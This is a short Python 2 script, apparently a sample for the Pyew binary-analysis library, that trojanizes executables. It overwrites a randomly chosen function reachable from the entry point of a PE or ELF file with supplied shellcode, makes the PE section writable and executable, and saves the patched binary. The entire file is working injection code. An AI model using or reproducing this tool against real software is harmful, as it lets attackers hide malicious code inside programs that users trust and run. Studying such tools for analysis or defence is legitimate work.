#!/usr/bin/python

import sys
import random
import pefile

from pyew_core import CPyew

class CPatcher:
  def __init__(self, binary, sc, out):
    self.binary = binary
    self.sc = sc
    self.out = out
    self.pyew = CPyew(False, False)
    
    self.sc_buf = None

  def loadFiles(self):
    try:
      self.pyew.deepcodeanalysis = False
      print "[+] Loading and analysing file %s" % self.binary
      self.pyew.loadFile(self.binary)
    except:
      print "[!] Error loading binary file:", sys.exc_info()[1]
      return False
    
    try:
      self.sc_buf = open(self.sc, "rb").read()
    except:
      print "[!] Error reading shellcode file:", sys.exc_info()[1]
      return False
    
    if self.pyew.format not in ["PE", "ELF"]:
      print "[!] Format %s not supported" % self.pyew.format
      return False
    
    print "[i] Total of %d function(s) found in %s file" % (len(self.pyew.functions), self.pyew.format)
    print "[i] Entry point function %s at 0x%08x" % (self.pyew.names[self.pyew.ep], self.pyew.ep)
    return True

  def internalPatch(self, off):
    """ Patch at offset 'off' with the contents of the shellcode """
    buf = self.pyew.getBuffer()
    out_buf = buf[:off] + self.sc_buf + buf[off+len(self.sc_buf):]
    
    # Adjust section's privileges for PE files
    if self.pyew.format == "PE":
      pe = pefile.PE(data=out_buf)
      IMAGE_SCN_MEM_READWRITEEXEC = 0xe0000000L
      for section in pe.sections:
        if off >= section.PointerToRawData and off <= section.PointerToRawData+section.SizeOfRawData:
          print "[+] Patching section %s" % section.Name
          section.Characteristics |= IMAGE_SCN_MEM_READWRITEEXEC
    
    try:
      print "[+] Writing output file %s" % self.out
      if self.pyew.format != "PE":
        f = open(self.out, "wb")
        f.write(out_buf)
        f.close()
      else:
        pe.write(self.out)
      return True
    except:
      print "[!] Error writing output file", sys.exc_info()[1]
      return False

  def findFunctionAndPatch(self):
    """ Find a random function called from the entry point to patch """
    g = self.pyew.callgraph
    funcs = g.nodes()
    ep = g.node(self.pyew.names[self.pyew.ep])
    
    while 1:
      f = random.choice(funcs)
      if f == ep:
        continue
      path = g.searchPath(ep, f)
      if path is not None:
        f = self.pyew.getFunction(f.name)
        print "[i] Function at offset 0x%08x will be patched" % f
        break
    
    return self.internalPatch(f)

  def patch(self):
    if self.loadFiles():
      return self.findFunctionAndPatch()
    return False

def main():
  bin = sys.argv[1]
  sc = sys.argv[2]
  out = sys.argv[3]
  patcher = CPatcher(bin, sc, out)
  if patcher.patch():
    print "[+] All finished!"

def usage():
  print "Example Pyew script for patching an executable's random function"
  print "with a given shellcode."
  print
  print "Usage:", sys.argv[0], "<executable> <shellcode file> <output file>"

if __name__ == "__main__":
  if len(sys.argv) < 4:
    usage()
  else:
    main()
